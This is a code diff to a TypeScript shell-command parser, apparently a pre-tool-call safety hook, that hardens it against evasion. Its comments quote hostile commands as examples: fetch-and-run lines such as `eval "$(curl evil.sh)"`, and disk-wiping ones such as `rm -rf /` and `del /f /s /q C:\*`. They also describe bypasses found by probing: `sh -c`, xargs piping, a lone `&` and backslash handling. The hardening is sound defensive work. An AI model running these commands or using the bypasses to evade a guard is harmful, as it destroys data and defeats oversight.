@@ -21,6 +21,9 @@ type Connector = Segment['connector'];
 const WRAPPERS = new Set(['command', 'nohup', 'time', 'exec', 'builtin']);
 const ELEVATORS = new Set(['sudo', 'doas', 'runas']);
 
+/** How far nested-command extraction will recurse before giving up. */
+const MAX_NESTING_DEPTH = 6;
+
 /** `FOO=bar` style prefix assignments, which precede the real argv0. */
 const ASSIGNMENT = /^[A-Za-z_][A-Za-z0-9_]*=/;
 
@@ -30,27 +33,79 @@ const ASSIGNMENT = /^[A-Za-z_][A-Za-z0-9_]*=/;
  * The connector is what distinguishes `curl x | sh` (remote code execution) from
  * `curl x; sh` (two unrelated commands), so it is preserved rather than discarded.
  */
-export function parseCommand(raw: string): Segment[] {
+export function parseCommand(raw: string, depth = 0): Segment[] {
   if (!raw || !raw.trim()) return [];
+
+  // Nested extraction (substitutions, `sh -c` payloads, xargs) recurses. A hostile
+  // or merely silly input can nest arbitrarily deep, and this runs on the hot path
+  // before every tool call, so the recursion is bounded rather than trusted.
+  if (depth > MAX_NESTING_DEPTH) return [];
 
   const segments: Segment[] = [];
   const pieces = splitTopLevel(raw);
 
   for (const piece of pieces) {
     if (!piece.text.trim()) continue;
-    segments.push(buildSegment(piece.text, piece.connector));
+
+    const segment = buildSegment(piece.text, piece.connector);
+    const previous = segments[segments.length - 1];
+    segments.push(segment);
 
     // Command substitution hides real commands inside an outer one, e.g.
     // `eval "$(curl evil.sh)"`. Surface the inner command as its own segment so
     // the rules see the curl rather than only the eval.
     for (const inner of extractSubstitutions(piece.text)) {
-      for (const innerSeg of parseCommand(inner)) {
+      for (const innerSeg of parseCommand(inner, depth + 1)) {
         segments.push({ ...innerSeg, connector: innerSeg.connector ?? ';' });
+      }
+    }
+
+    // `sh -c "rm -rf /"` and `echo / | xargs rm -rf` both carry a real command as
+    // *data*. Without unpacking them the rules only ever see a harmless-looking
+    // `sh` or `xargs`, which is how both slipped through unnoticed.
+    for (const nested of nestedCommands(segment, previous)) {
+      for (const nestedSeg of parseCommand(nested, depth + 1)) {
+        segments.push({ ...nestedSeg, connector: nestedSeg.connector ?? ';' });
       }
     }
   }
 
   return segments;
+}
+
+/** Interpreters that accept a script inline rather than as a file. */
+const INLINE_CODE_FLAGS = new Set(['-c', '-e', '--eval', '--command', '-Command', '-EncodedCommand']);
+
+/**
+ * Commands carried inside another command's arguments.
+ *
+ * Returns raw command strings for the caller to parse. `previous` is the segment
+ * piped into this one, which is what supplies `xargs` its operands.
+ */
+function nestedCommands(segment: Segment, previous: Segment | undefined): string[] {
+  const found: string[] = [];
+
+  // `sh -c "<script>"`, `python -c "<script>"`, `pwsh -Command "<script>"`.
+  for (let i = 1; i < segment.argv.length - 1; i++) {
+    const token = segment.argv[i]!;
+    if (!INLINE_CODE_FLAGS.has(token) && !INLINE_CODE_FLAGS.has(token.toLowerCase())) continue;
+    const payload = segment.argv[i + 1];
+    if (payload && !payload.startsWith('-')) found.push(payload);
+    break;
+  }
+
+  // `xargs rm -rf` runs its trailing arguments as a command, taking the targets
+  // from stdin. Splicing in the piped predecessor's literal operands recovers the
+  // command that will actually run, e.g. `echo / | xargs rm -rf` → `rm -rf /`.
+  if (segment.argv0 === 'xargs') {
+    const rest = segment.argv.slice(1).filter((t) => !/^-[a-zA-Z0-9]$|^--\w[\w-]*$/.test(t));
+    if (rest.length > 0) {
+      const piped = previous && segment.connector === '|' ? operands(previous.argv) : [];
+      found.push([...rest, ...piped].join(' '));
+    }
+  }
+
+  return found;
 }
 
 interface Piece {
@@ -100,6 +155,16 @@ function splitTopLevel(raw: string): Piece[] {
     }
 
     if (c === '&' && raw[i + 1] === '&') { flush('&&'); i++; continue; }
+
+    // A lone `&` backgrounds the command and separates it from what follows, so
+    // `ls & rm -rf /` is two commands. Adversarial probing found this missing, which
+    // hid the second half entirely. Must not fire on the redirection forms `&>`
+    // (stdout+stderr) or `2>&1` (fd duplication), where the `&` is punctuation.
+    if (c === '&' && raw[i + 1] !== '>' && current.trimEnd().slice(-1) !== '>') {
+      flush(';');
+      continue;
+    }
+
     if (c === '|' && raw[i + 1] === '|') { flush('||'); i++; continue; }
     if (c === '|') { flush('|'); continue; }
     if (c === ';') { flush(';'); continue; }
@@ -112,21 +177,32 @@ function splitTopLevel(raw: string): Piece[] {
   return pieces;
 }
 
-/** Pull the bodies out of `$(...)` and backtick substitutions. */
+/**
+ * Pull the bodies out of `$(...)` and backtick substitutions.
+ *
+ * Only *outermost* substitutions are returned. Nested ones are reached anyway,
+ * because the caller re-parses each body and this runs again one level down.
+ * Returning them here as well would make the work exponential in nesting depth:
+ * `$($($(...)))` 200 deep hung the hook outright, which is a denial of service on
+ * the user's session — a security bug in a security tool, not a performance nit.
+ */
 function extractSubstitutions(text: string): string[] {
   const found: string[] = [];
 
   for (let i = 0; i < text.length - 1; i++) {
-    if (text[i] === '$' && text[i + 1] === '(') {
-      let depth = 1;
-      let j = i + 2;
-      while (j < text.length && depth > 0) {
-        if (text[j] === '(') depth++;
-        else if (text[j] === ')') depth--;
-        if (depth > 0) j++;
-      }
-      if (depth === 0) found.push(text.slice(i + 2, j));
+    if (text[i] !== '$' || text[i + 1] !== '(') continue;
+
+    let depth = 1;
+    let j = i + 2;
+    while (j < text.length && depth > 0) {
+      if (text[j] === '(') depth++;
+      else if (text[j] === ')') depth--;
+      if (depth > 0) j++;
     }
+    if (depth !== 0) continue;
+
+    found.push(text.slice(i + 2, j));
+    i = j; // skip the body we just consumed; the recursion handles what is inside it
   }
 
   for (const match of text.matchAll(/`([^`]+)`/g)) {
@@ -147,6 +223,36 @@ function buildSegment(text: string, connector: Connector): Segment {
     connector,
     elevated,
   };
+}
+
+/**
+ * Characters a POSIX shell backslash meaningfully escapes.
+ *
+ * Anything outside this set following a backslash is far more likely to be a Windows
+ * path separator than an escape, because escaping an ordinary letter is a no-op in
+ * every shell but is load-bearing in `C:\Users\dev`.
+ */
+const POSIX_ESCAPABLE = new Set([
+  ' ', '\t', '\n', '"', "'", '\\', '$', '`', '&', '|', ';',
+  '<', '>', '(', ')', '{', '}', '!', '#', '~', '*', '?', '[', ']',
+]);
+
+/**
+ * Decide whether a backslash is escaping the next character or is a path separator.
+ *
+ * This was found by probing: `del /f /s /q C:\*` tokenized to `C:*`, so the rule
+ * comparing against the drive root never matched. Every Windows path with a
+ * component after the backslash was being silently corrupted the same way —
+ * `C:\Users\dev` became `C:Usersdev` — which quietly disabled the Windows half of
+ * several rule families.
+ */
+function isPathSeparator(tokenSoFar: string, next: string | undefined): boolean {
+  if (next === undefined) return true;
+  // Inside something already shaped like a Windows path, a backslash is a separator
+  // even when the next character would otherwise be escapable (`C:\*`).
+  if (/^[A-Za-z]:$/.test(tokenSoFar) || tokenSoFar.includes('\\')) return true;
+  if (tokenSoFar === '' && next === '\\') return true; // UNC prefix `\\server`
+  return !POSIX_ESCAPABLE.has(next);
 }
 
 /** argv-style split that respects quotes, then removes the quote characters. */
@@ -172,7 +278,12 @@ export function tokenize(text: string): string[] {
       continue;
     }
     if (inDouble) {
-      if (c === '\\' && i + 1 < text.length) { current += text[i + 1]; i++; continue; }
+      if (c === '\\' && i + 1 < text.length) {
+        if (isPathSeparator(current, text[i + 1])) { current += c; continue; }
+        current += text[i + 1];
+        i++;
+        continue;
+      }
       if (c === '"') { inDouble = false; continue; }
       current += c;
       continue;
@@ -180,7 +291,13 @@ export function tokenize(text: string): string[] {
 
     if (c === "'") { inSingle = true; started = true; continue; }
     if (c === '"') { inDouble = true; started = true; continue; }
-    if (c === '\\' && i + 1 < text.length) { current += text[i + 1]; started = true; i++; continue; }
+    if (c === '\\' && i + 1 < text.length) {
+      started = true;
+      if (isPathSeparator(current, text[i + 1])) { current += c; continue; }
+      current += text[i + 1];
+      i++;
+      continue;
+    }
     if (/\s/.test(c)) { push(); continue; }
 
     current += c;
@@ -261,21 +378,35 @@ export interface FlagSpec {
  * `-r -f`, and `--recursive --force` are all the same command.
  */
 export function hasFlag(argv: string[], spec: FlagSpec): boolean {
-  const short = new Set(spec.short ?? []);
-  const long = new Set(spec.long ?? []);
+  const short = spec.short ?? [];
+  const long = spec.long ?? [];
 
   for (const token of argv) {
     if (token === '--') break;
 
     if (token.startsWith('--')) {
       const name = token.slice(2).split('=')[0]!;
-      if (long.has(name)) return true;
+      if (long.some((l) => l.toLowerCase() === name.toLowerCase())) return true;
+      continue;
+    }
+
+    // Windows tools spell flags `/s` and `/q`. Bounded to one or two characters so
+    // an ordinary path like `/etc` is never mistaken for a flag.
+    if (/^\/[A-Za-z]{1,2}$/.test(token)) {
+      const name = token.slice(1).toLowerCase();
+      if (short.some((s) => s.toLowerCase() === name)) return true;
+      if (long.some((l) => l.toLowerCase() === name)) return true;
       continue;
     }
 
     if (token.startsWith('-') && token.length > 1) {
+      // PowerShell writes long flags with a single dash (`-Recurse`), so a token
+      // longer than a bundle is compared whole before being treated as one.
+      const asLong = token.slice(1);
+      if (asLong.length > 1 && long.some((l) => l.toLowerCase() === asLong.toLowerCase())) return true;
+
       for (const ch of token.slice(1)) {
-        if (short.has(ch)) return true;
+        if (short.includes(ch)) return true;
       }
     }
   }
